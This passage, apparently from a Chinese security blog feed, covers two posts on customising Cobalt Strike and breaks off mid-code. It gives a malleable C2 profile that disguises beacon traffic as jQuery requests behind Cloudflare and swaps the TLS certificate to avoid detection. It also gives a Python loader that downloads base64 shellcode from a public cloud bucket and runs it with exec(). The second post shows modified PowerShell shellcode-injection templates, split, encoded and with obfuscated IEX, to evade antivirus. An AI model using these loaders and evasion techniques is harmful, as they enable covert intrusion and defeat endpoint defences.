alt="image-20220905231849382"><br>等待检查完成<br><img src="/posts/a28d2b5c/image-20220906084008556.png" alt="image-20220906084008556"><br>收到邮件后用超级ping测试</p><h4 id="5、下载C2文件模版，修改配置并上传"><a href="#5、下载C2文件模版，修改配置并上传" class="headerlink" title="5、下载C2文件模版，修改配置并上传"></a>5、下载C2文件模版，修改配置并上传</h4><p><a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a><br>选择CS对应的版本修改 我是4.5版本就修改jquery-c2.4.5.profile<br>搜索http get<br><img src="/posts/a28d2b5c/image-20220906090721630.png" alt="image-20220906090721630"><br>修改为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    set uri &quot;/jquery-3.3.1.min.js&quot;;</span><br><span class="line">    set verb &quot;GET&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;你配置的域名&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://你配置的域名/&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend &quot;__cfduid=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>搜索http post<br><img src="/posts/a28d2b5c/image-20220906091200776.png" alt="image-20220906091200776"><br>修改为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/jquery-3.3.2.min.js&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.woaikansese.shop&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.woaikansese.shop/&quot;;</span><br><span class="line">        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;       </span><br><span class="line">        id &#123;</span><br><span class="line">            mask;       </span><br><span class="line">            base64url;</span><br><span class="line">            parameter &quot;__cfduid&quot;;            </span><br><span class="line">        &#125;       </span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>修改完成后将修改的文件上传的CS的服务端</p><h4 id="6、启动CS加载CS模版，"><a href="#6、启动CS加载CS模版，" class="headerlink" title="6、启动CS加载CS模版，"></a>6、启动CS加载CS模版，</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x passwd jquery-c2.4.5.profile</span><br></pre></td></tr></table></figure><p>创建监听器<br><img src="/posts/a28d2b5c/image-20220906092920872.png" alt="image-20220906092920872"><br><strong>注意1：</strong><br>因为cloudflare的原因这里端口的设置需要注意以下：<br>若是http，则只能设置80,8080,8880,2052,2082,2086,2095这些端口号<br>若是https，则只能设置443,2053,2083,2087,2096,8443这些端口号<br><strong>注意2：</strong><br>后门生成使用Stageless模式<br><img src="/posts/a28d2b5c/image-20220906100648532.png" alt="image-20220906100648532"><br>成功上线<br>用火绒剑分析下<br><img src="/posts/a28d2b5c/image-20220906100919331.png" alt="image-20220906100919331"><br><img src="/posts/a28d2b5c/image-20220906100945570.png" alt="image-20220906100945570"><br>ip地址为CDN地址</p><h2 id="防特征审计-SSL证书"><a href="#防特征审计-SSL证书" class="headerlink" title="防特征审计-SSL证书"></a>防特征审计-SSL证书</h2><h4 id="1、配置SSL设置"><a href="#1、配置SSL设置" class="headerlink" title="1、配置SSL设置"></a>1、配置SSL设置</h4><p>创建证书（SSL-源服务器）<br>在cloudflare创建证书<br><img src="/posts/a28d2b5c/image-20220906104458013.png" alt="image-20220906104458013"><br><img src="/posts/a28d2b5c/image-20220906104537158.png" alt="image-20220906104537158"><br>将Origin Certificate保存到本地命名为sever.pem,Private Key保存为sever.key<br><img src="/posts/a28d2b5c/image-20220906104832429.png" alt="image-20220906104832429"><br>设置页面规则(缓存级别-绕过)<br><img src="/posts/a28d2b5c/image-20220906105158083.png" alt="image-20220906105158083"><br><img src="/posts/a28d2b5c/image-20220906105336222.png" alt="image-20220906105336222"><br>url处为域名加上&#x2F;*js</p><h4 id="2、生成证书文件"><a href="#2、生成证书文件" class="headerlink" title="2、生成证书文件"></a>2、生成证书文件</h4><p>把刚才保存的两个文件传到服务器<br>运行下面两条命令注意修改为自己的域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out www.woaikansese.shop.p12 -name www.woaikansese.shop -passout pass:123456</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore www.woaikansese.shop.store -srckeystore www.woaikansese.shop.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.woaikansese.shop</span><br></pre></td></tr></table></figure><p>会生成一个<a href="http://www.woaikansese.shop.store文件/">www.woaikansese.shop.store文件</a></p><h4 id="3、修改teamserver"><a href="#3、修改teamserver" class="headerlink" title="3、修改teamserver"></a>3、修改teamserver</h4><p>证书指向：<a href="http://www.woaikansese.shop.store/">www.woaikansese.shop.store</a><br>修改最后一行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStore=./cobaltstrike.store</span></span><br><span class="line">-Djavax.net.ssl.keyStore=./www.woaikansese.shop.store</span><br></pre></td></tr></table></figure><p>证书密码：123456</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">原:-Djavax.net.ssl.keyStorePassword=Microsoft</span></span><br><span class="line">-Djavax.net.ssl.keyStorePassword=123456</span><br></pre></td></tr></table></figure><h4 id="4、启动teamserver"><a href="#4、启动teamserver" class="headerlink" title="4、启动teamserver"></a>4、启动teamserver</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x passwd jquery-c2.4.5.profile</span><br></pre></td></tr></table></figure><p>创建一个https的监听器<br><img src="/posts/a28d2b5c/image-20220906122429149.png" alt="image-20220906122429149"><br>还是使用Stageless模式的马<br>证书特征修改成功 成功上线<br><img src="/posts/a28d2b5c/image-20220906162918608.png" alt="image-20220906162918608"><br><img src="/posts/a28d2b5c/image-20220906163921303.png" alt="image-20220906163921303"></p><h2 id="防流量审计-OSS存储"><a href="#防流量审计-OSS存储" class="headerlink" title="防流量审计-OSS存储"></a>防流量审计-OSS存储</h2><p>把数据放到oss oss域名是一个绿标可能会认为是一下资源在加载杀毒软件会放行<br>产品：阿里云，腾讯云等</p><h4 id="1、开启OSS对象存储"><a href="#1、开启OSS对象存储" class="headerlink" title="1、开启OSS对象存储"></a>1、开启OSS对象存储</h4><p>在阿里云购买OSS服务<a href="https://www.aliyun.com/product/oss">https://www.aliyun.com/product/oss</a></p><h4 id="2、创建Bucket列表"><a href="#2、创建Bucket列表" class="headerlink" title="2、创建Bucket列表"></a>2、创建Bucket列表</h4><p><img src="/posts/a28d2b5c/image-20220906183907524.png" alt="image-20220906183907524"><br>注意读写权限要选择:公共读<br><img src="/posts/a28d2b5c/image-20220906184033570.png" alt="image-20220906184033570"></p><h4 id="3、上传Shellcode文件"><a href="#3、上传Shellcode文件" class="headerlink" title="3、上传Shellcode文件"></a>3、上传Shellcode文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode = <span class="string">b&quot;**shellcode**&quot;</span> <span class="comment"># CS生成shellcode32位还是64位根据python位数而定</span></span><br><span class="line"><span class="comment">#64位python加载代码 </span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>将上面代码填入shellcode，base64加密后上传到阿里云oss<br><img src="/posts/a28d2b5c/image-20220906185553274.png" alt="image-20220906185553274"><br>注意选择共有读或者 继承 Bucket<br><img src="/posts/a28d2b5c/image-20220906185632114.png" alt="image-20220906185632114"></p><h4 id="4、获取地址-amp-代码加载"><a href="#4、获取地址-amp-代码加载" class="headerlink" title="4、获取地址&amp;代码加载"></a>4、获取地址&amp;代码加载</h4><p>上传完成后点击分析获取链接填入下面上线代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,base64</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">myURL = urlopen(<span class="string">&quot;OSS获取到的URL&quot;</span>)</span><br><span class="line">z=myURL.read()</span><br><span class="line">zx=base64.b64decode(z)</span><br><span class="line"><span class="built_in">exec</span>(zx)</span><br></pre></td></tr></table></figure><p><img src="/posts/a28d2b5c/image-20220906185900487.png" alt="image-20220906185900487"></p>]]></content>
      
      
      <categories>
          
          <category> CobaltStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike简单二开学习记录(下)</title>
      <link href="/posts/2f863dad/"/>
      <url>/posts/2f863dad/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike简单二开学习记录-下"><a href="#CobaltStrike简单二开学习记录-下" class="headerlink" title="CobaltStrike简单二开学习记录(下)"></a>CobaltStrike简单二开学习记录(下)</h1><h2 id="C-x2F-C-–生成-amp-模版修改"><a href="#C-x2F-C-–生成-amp-模版修改" class="headerlink" title="C&#x2F;C++–生成&amp;模版修改"></a>C&#x2F;C++–生成&amp;模版修改</h2><p>直接搜索payload关键字(unsigned char buf[])找到代码<br>payload生成位置:\decompiled_src\encoders\Transforms.java<br>toC函数：<br><img src="/posts/2f863dad/image-20220904155924279.png" alt="image-20220904155924279"><br>老样子复制到src目录下进行修改具体方法见上篇<br>添加base64加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toC(<span class="type">byte</span>[] var0) &#123;</span><br><span class="line"><span class="type">Packer</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Packer</span>();</span><br><span class="line">var1.addString(<span class="string">&quot;/* length: &quot;</span> + var0.length + <span class="string">&quot; bytes */\n&quot;</span>);</span><br><span class="line">var1.addString(<span class="string">&quot;unsigned char buf[] = \&quot;&quot;</span> + Base64.encode(CommonUtils.bString(toVeil(var0))) + <span class="string">&quot;\&quot;;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> var1.getBytes();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译<br>替换原来jar包的ransforms.java具体方法见上篇<br>将修改好的jar包替换到服务端和客户端<br>测试:生成一个c的payload</p><p><img src="/posts/2f863dad/image-20220904161045777.png" alt="image-20220904161045777"><br>生成即为base64加密<br>注意后续使用的时候还需要加一个b来转换为byte流数据</p><h2 id="Powershell-生成-amp-模版修改"><a href="#Powershell-生成-amp-模版修改" class="headerlink" title="Powershell-生成&amp;模版修改"></a>Powershell-生成&amp;模版修改</h2><p>默认生成32位powershell payload为</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$DoIt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">Param ($var_module, $var_procedure)</span></span><br><span class="line"><span class="string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">Param (</span></span><br><span class="line"><span class="string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;%%DATA%%&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$DoIt</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$DoIt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上节课的思路是直接将免杀代码替换模板文件但这也就造成了一个问题上线ip和端口和协议已经被写死了无法替换，我们能不能尝试修改生成逻辑达到可以修改相关信息同时达到免杀呢?<br>payload的生成代码位置在:\decompiled_src\common\ResourceUtils.java 可以看到使用<code>%%DATA%%</code>生成传递给模板文件<br>同样是修改模板文件但是这次不能修改<code>%%DATA%%</code> 使CS可以正常传递payload<br>可以采取的思路将原模板分离最后再拼接也就是分为以下三个变量再进行拼接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"><span class="variable">$x1</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">Param ($var_module, $var_procedure)</span></span><br><span class="line"><span class="string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">Param (</span></span><br><span class="line"><span class="string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x2</span>=<span class="string">&#x27;%%DATA%%&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x3</span> =<span class="string">@&#x27;</span></span><br><span class="line"><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br></pre></td></tr></table></figure><p>最后拼接执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xx</span>=<span class="variable">$x1</span>+<span class="variable">$x2</span>+<span class="variable">$x3</span></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$xx</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">IEX</span> <span class="variable">$xx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先把%%DATA%%换成payload进行测试能否正常上线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy bypass -File test.ps1</span><br></pre></td></tr></table></figure><p><img src="/posts/2f863dad/image-20220904123821927.png" alt="image-20220904123821927"></p><p>成功上线<br>现在解决了生成问题接下来要解决免杀问题<br>可以对以上三个部分进行base64编码然后解码再进行执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"><span class="variable">$x1</span>=<span class="string">&#x27;加密内容&#x27;</span></span><br><span class="line"><span class="variable">$x2</span>=<span class="string">&#x27;加密内容&#x27;</span> <span class="comment">#先用生成的shellcode再次加密 进行测试</span></span><br><span class="line"><span class="variable">$x3</span>=<span class="string">&#x27;加密内容&#x27;</span></span><br><span class="line"><span class="variable">$xx1</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x1</span>))</span><br><span class="line"><span class="variable">$xx2</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x2</span>))</span><br><span class="line"><span class="variable">$xx3</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x3</span>))</span><br><span class="line"><span class="variable">$xxx</span>=<span class="variable">$xx1</span>+<span class="variable">$xx2</span>+<span class="variable">$xx3</span></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) IE`X <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$xxx</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">I`EX <span class="variable">$xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老样子<code>%%DATA%%</code>换shellcode先测试</p><p><img src="/posts/2f863dad/image-20220904125640429.png" alt="image-20220904125640429"><br>依然可以上线<br><img src="/posts/2f863dad/image-20220904125747999.png" alt="image-20220904125747999"><br>成功免杀火绒<br>测试完成接下来要对CS的源代码做文章打到生成即可免杀<br>$x2位置源码在这里会更加监听器配置进行生成base64 我们需要再次base64加密所以修改源码<br>ResourceUtils.java复制到src&#x2F;common&#x2F;ResourceUtils.java 具体方法看上篇<br>_buildPowerShellNoHint函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 